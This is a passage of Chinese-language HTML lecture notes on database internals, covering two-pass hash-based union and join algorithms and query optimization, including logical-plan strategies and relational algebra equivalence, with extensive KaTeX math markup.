style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>形成散列数据结构，进行分组聚集操作。</li><li>应选择不同的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>p</mi></msub><mo separator="true">,</mo><msub><mi>h</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">h_p,h_r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ul></li><li>并操作<ul><li>包的并无需两次，直接合并即可</li><li>集合的并需要两趟，需要去重复。</li><li>第一趟：以相同的散列函数将R和S形成M-2个子表<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">R_i,S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>第二趟：将<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>再整体散列读入内存中，再依次处理<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">R_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的每一块，如判断<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">R_i,S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>都出现元组t，则仅输出t的一个副本，否则输出<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>R</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">S_i,Ri</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">i</span></span></span></span></eq></li></ul></li><li>交叉操作类似并操作</li><li>连接操作<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mo>⋈</mo><mrow><mi>R</mi><mi mathvariant="normal">.</mi><mi>y</mi><mo>=</mo><mi>S</mi><mi mathvariant="normal">.</mi><mi>y</mi></mrow></msub><mi>S</mi></mrow><annotation encoding="application/x-tex">R\Join_{R.y=S.y} S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mord mtight">.</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mord mtight">.</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq></li><li>以连接属性Y作为散列关键字，设计散列函数</li><li>第一趟：使用相同的散列函数散列两个操作对象R和S，形成R1…Rm,S1…Sm</li><li>第二趟：将Si再整体散列读入到内存中，再依次处理Ri的每一块，进行连接</li></ul></li></ul><h2 id="%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%9F%A5%E8%AF%A2%E7%BC%96%E8%AF%91%E5%99%A8" tabindex="-1">第五章 查询编译器</h2><h3 id="2101-%E4%BB%80%E4%B9%88%E6%98%AF%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96" tabindex="-1">2101 什么是查询优化</h3><h4 id="%EF%BC%881%EF%BC%89%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96" tabindex="-1">（1）为什么需要查询优化</h4><ul><li>关系数据库的执行效率问题</li><li>关系代数操作执行次序对效率的影响</li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AF%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96" tabindex="-1">（2）什么是查询优化</h4><ul><li>如何使数据库查询时间最短</li><li>三个层面进行优化<ul><li>语义优化：利用模型的语义及完整性规则，优化查询</li><li>语法优化—逻辑层优化：利用语法结构，优化操作执行顺序</li><li>执行优化—物理层优化：存取路径和执行算法的选择与执行次序优化</li></ul></li></ul><h3 id="2102-%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96%E7%9A%84%E6%80%BB%E4%BD%93%E6%80%9D%E8%B7%AF" tabindex="-1">2102 查询优化的总体思路</h3><h4 id="%EF%BC%881%EF%BC%89%E8%AF%AD%E4%B9%89%E4%BC%98%E5%8C%96%E2%80%93%E5%86%85%E5%AE%B9%E7%AD%89%E4%BB%B7%E6%80%A7" tabindex="-1">（1）语义优化–内容等价性</h4><p>sql层优化，不在这里进行讨论，此处需要用户取想办法，相关研究再进行了</p><h4 id="%EF%BC%882%EF%BC%89%E8%AF%AD%E6%B3%95%E4%BC%98%E5%8C%96%EF%BC%88%E9%80%BB%E8%BE%91%E5%B1%82%E4%BC%98%E5%8C%96%EF%BC%89%E2%80%93%E5%86%85%E5%AE%B9%E7%AD%89%E4%BB%B7%E6%80%A7" tabindex="-1">（2）语法优化（逻辑层优化）–内容等价性</h4><ul><li>基本思想：改变关系代数的操作次序：尽可能地早做选择和投影运算</li><li>关系代数地五种基本操作中哪些能够交换次序</li><li>次序变化前后两个表达式地等价性问题</li><li>关系代数表达式的等价变换定理及证明（略）</li><li>关系代数表达式的优化算法？逻辑查询计划形成</li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%89%A7%E8%A1%8C%E4%BC%98%E5%8C%96%EF%BC%88%E7%89%A9%E7%90%86%E5%B1%82%E4%BC%98%E5%8C%96%EF%BC%89" tabindex="-1">（3）执行优化（物理层优化）</h4><ul><li>获取数据库的相关信息（定期统计）</li><li>实现同一关系操作的不同例行程序</li><li>选择相应的例行程序</li><li>依据相关信息进行代价估算，选择代价最少的例行程序及确定相应的参数</li><li>形成查询计划：以基本的例行程序为基本，确定这些例行程序的执行顺序</li></ul><h4 id="%EF%BC%884%EF%BC%89%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96%E7%9A%84%E6%80%BB%E8%BF%87%E7%A8%8B" tabindex="-1">（4）查询优化的总过程</h4><ul><li>用户书写sql语言</li><li>转化为关系代数</li><li>逻辑查询计划–逻辑层优化<ul><li>关系代数操作顺序的优化</li></ul></li><li>物理查询计划–物理层优化<ul><li>代价估算</li><li>算法选择与装配次序</li></ul></li><li>由执行引擎解释并调用算法（程序）予以执行</li></ul><h3 id="2103-%E9%80%BB%E8%BE%91%E5%B1%82%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5" tabindex="-1">2103 逻辑层优化策略</h3><h4 id="%EF%BC%881%EF%BC%89%E4%B8%80%E4%B8%AA%E5%BE%85%E4%BC%98%E5%8C%96%E7%9A%84%E5%AE%9E%E4%BE%8B%E8%83%8C%E6%99%AF" tabindex="-1">（1）一个待优化的实例背景</h4><p>考虑一个图书馆的关系数据库<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mi>O</mi><mi>O</mi><mi>K</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mi>U</mi><mi>T</mi><mi>L</mi><mi>E</mi><mo separator="true">,</mo><mi>A</mi><mi>U</mi><mi>T</mi><mi>H</mi><mi>O</mi><mi>R</mi><mo separator="true">,</mo><mi>P</mi><mi>N</mi><mi>A</mi><mi>M</mi><mi>E</mi><mo separator="true">,</mo><mi>L</mi><mi>C</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">BOOKS(TUTLE,AUTHOR,PNAME,LC\_NO)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">BOO</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.00773em;">OR</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">PN</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ME</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span><span class="mclose">)</span></span></span></span></eq><br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>N</mi><mi>A</mi><mi>M</mi><mi>E</mi></mrow><annotation encoding="application/x-tex">PNAME</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">PN</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ME</span></span></span></span></eq>为出版社名，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>C</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi></mrow><annotation encoding="application/x-tex">LC\_NO</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span></span></span></span></eq>为图书馆图书编号<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>U</mi><mi>B</mi><mi>L</mi><mi>I</mi><mi>S</mi><mi>H</mi><mi>E</mi><mi>R</mi><mi>S</mi><mo stretchy="false">(</mo><mi>P</mi><mi>N</mi><mi>A</mi><mi>M</mi><mi>E</mi><mo separator="true">,</mo><mi>P</mi><mi>A</mi><mi>D</mi><mi>D</mi><mi>R</mi><mo separator="true">,</mo><mi>P</mi><mi>C</mi><mi>I</mi><mi>T</mi><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">PUBLISHERS(PNAME,PADDR,PCITY)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.05764em;">ERS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">PN</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ME</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">DD</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></eq><br>出版社名字，出版社地址，出版社城市<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mi>O</mi><mi>R</mi><mi>R</mi><mi>O</mi><mi>W</mi><mi>E</mi><mi>R</mi><mi>S</mi><mo stretchy="false">(</mo><mi>N</mi><mi>A</mi><mi>M</mi><mi>E</mi><mo separator="true">,</mo><mi>A</mi><mi>D</mi><mi>D</mi><mi>R</mi><mo separator="true">,</mo><mi>C</mi><mi>I</mi><mi>T</mi><mi>Y</mi><mo separator="true">,</mo><mi>C</mi><mi>A</mi><mi>R</mi><mi>D</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">BORROWERS(NAME,ADDR,CITY,CARD\_NO)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">BORRO</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">ERS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ME</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">DD</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span><span class="mclose">)</span></span></span></span></eq><br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>A</mi><mi>R</mi><mi>D</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi></mrow><annotation encoding="application/x-tex">CARD\_NO</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span></span></span></span></eq>为图书证号<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>O</mi><mi>A</mi><mi>D</mi><mi>S</mi><mo stretchy="false">(</mo><mi>C</mi><mi>A</mi><mi>R</mi><mi>D</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi><mo separator="true">,</mo><mi>L</mi><mi>C</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi><mo separator="true">,</mo><mi>D</mi><mi>A</mi><mi>T</mi><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">LOADS(CARD\_NO,LC\_NO,DATE)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">TE</span><span class="mclose">)</span></span></span></span></eq></p><h4 id="%EF%BC%882%EF%BC%89%E7%94%A8%E8%AF%AD%E6%B3%95%E6%A0%91%E8%A1%A8%E8%BE%BE%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F" tabindex="-1">（2）用语法树表达关系代数表达式</h4><ul><li>由树叶向树根反映了操作的先后次序</li></ul><h4 id="%EF%BC%883%EF%BC%89%E9%80%BB%E8%BE%91%E4%BC%98%E5%8C%96%E7%9A%84%E7%AD%96%E7%95%A5" tabindex="-1">（3）逻辑优化的策略</h4><ul><li>尽可能地早做选择和投影<ul><li>可以使得中间结果变小，减小几个数量级的执行时间</li></ul></li><li>把选择和投影串接起来：<ul><li>一元运算序列可以一起执行，只需对整个关系扫描一遍</li></ul></li><li>把投影与其前后的二元运算结合起来<ul><li>在第一次用关系时去掉一些无关属性，可以避免多次扫描整个关系</li></ul></li><li>把某些选择与其前的笛卡尔积合并成一个连接<ul><li>当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>×</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">R\times S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>前有选择运算且期中有条件是R，S属性间的比较运算时，可将其转化为连接运算可节省时间</li></ul></li><li>执行连接运算前对关系适当预处理<ul><li>文件排序，建立临时索引等，可以使得俩关系公共值高效连接</li></ul></li><li>找出表达式里的公共子表达式<ul><li>若公共子表达式结果不大，可以预先计算，以后可读入此结果，节省时间较多，在试图情况下尤其有用</li></ul></li></ul><h3 id="2104-%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0%E6%93%8D%E4%BD%9C%E6%AC%A1%E5%BA%8F%E4%BA%A4%E6%8D%A2%E7%9A%84%E7%AD%89%E4%BB%B7%E6%80%A7" tabindex="-1">2104 关系代数操作次序交换的等价性</h3><h4 id="%EF%BC%881%EF%BC%89%E7%AD%89%E4%BB%B7%E6%80%A7" tabindex="-1">（1）等价性</h4><p>定义：</p><ul><li>设<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是两个关系操作表达式，若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>表示相同的映射，记当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" 